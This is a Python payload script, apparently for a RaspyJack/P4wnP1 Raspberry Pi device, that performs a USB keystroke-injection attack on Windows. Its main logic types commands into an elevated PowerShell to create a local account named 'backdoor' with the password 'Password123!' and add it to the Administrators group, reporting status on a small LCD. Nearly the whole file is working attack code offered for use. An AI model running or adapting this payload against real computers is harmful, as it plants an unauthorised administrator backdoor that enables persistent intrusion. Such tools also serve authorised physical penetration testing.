#!/usr/bin/env python3
"""
RaspyJack *payload* – **HID Attack: Add Windows Admin User**
==============================================================
A HID attack that opens an elevated PowerShell prompt on Windows and
creates a new local administrator account.

**NOTE:** This requires the user to accept the UAC prompt.
"""

import os, sys, subprocess, time
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

# --- CONFIGURATION ---
NEW_USERNAME = "backdoor"
NEW_PASSWORD = "Password123!"

# --- Display Functions ---
def show_message(lines):
    LCD = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    image = Image.new("RGB", (128, 128), "BLACK")
    draw = ImageDraw.Draw(image)
    font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
    y = 40
    for line in lines:
        draw.text((10, y), line, font=font, fill="lime")
        y += 15
    LCD.LCD_ShowImage(image, 0, 0)

# --- Main Attack Logic ---
def run_attack():
    show_message(["HID Attack:", "Win Add Admin"])
    
    if subprocess.run("which P4wnP1_cli", shell=True, capture_output=True).returncode != 0:
        show_message(["ERROR:", "P4wnP1_cli", "not found!"])
        return

    # Commands to add user and add them to administrators group
    command1 = f"net user /add {NEW_USERNAME} {NEW_PASSWORD}"
    command2 = f"net localgroup administrators {NEW_USERNAME} /add"
    
    # DuckyScript to open an elevated PowerShell
    # It presses Win+X, then 'a' for the admin PS prompt.
    # The user MUST accept the UAC prompt for this to work.
    script = f"""
GUI x
delay(500)
press("a")
delay(1500)
type("{command1}")
delay(200)
press("ENTER")
delay(500)
type("{command2}")
delay(200)
press("ENTER")
delay(500)
type("exit")
press("ENTER")
"""
    
    command = f"P4wnP1_cli hid job -c '{script}'"
    
    try:
        subprocess.run(command, shell=True, check=True, timeout=30)
        show_message(["Attack Sent!", "Win Add Admin"])
    except Exception as e:
        show_message(["Attack FAILED!"])
        print(f"Error running HID attack: {e}", file=sys.stderr)

# --- Execution ---
if __name__ == '__main__':
    try:
        run_attack()
        time.sleep(3)
    finally:
        LCD = LCD_1in44.LCD()
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("HID Attack payload finished.")
